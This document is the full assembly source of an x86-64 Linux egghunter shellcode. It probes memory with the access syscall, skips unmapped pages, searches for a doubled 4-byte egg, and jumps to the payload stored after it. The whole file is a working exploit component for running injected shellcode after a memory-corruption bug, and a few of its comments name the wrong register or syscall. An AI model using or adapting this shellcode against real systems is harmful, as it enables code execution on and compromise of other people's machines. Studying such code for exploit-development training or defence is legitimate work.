global _start

section .text

_start:
	xor rbx, rbx
	mov ebx, 0x50905090	; move the 4 bytes egg in ebx

	xor rdi, rdi 		; clear rdi register
	xor rdx, rdx		; clear ecx register

next_page:
	or dx, 0xfff		; page alignment operation
				; default page size is 4096 bytes (next_page + next_address = 4096 => 4095 + 1 = 4096)

next_address:
	inc rdx			; increment edx by 1 to reach the page size of 4096
	
	lea rdi, [rdx + 0x4]	; rdi is set with the value of rdx plus 4, so 8 bytes are validated at once

	xor rax, rax		; clear rax register
	mov al, 0x15		; 15 is the hex value of the decimal 21 for access syscall

	syscall			; exec access syscall

	cmp al, 0xf2		; compare return value of accept with 0xf2 (low byte of EFAULT return value)

	jz next_page		; jump short to next_page if zero (ZF = 1)

	cmp [rdx], ebx		; if the egg in ebx doesn't match rdx content go to the next address
	jnz next_address	; jump short if not zero (ZF = 0)

	cmp [rdx + 0x4], ebx	; if the egg in ebx doesn't match rdx+4 content go to the next address again
	jnz next_address	; jump short if not zero (ZF = 0)

	jmp rdx			; egg is found, jump short at rdx (our shellcode)
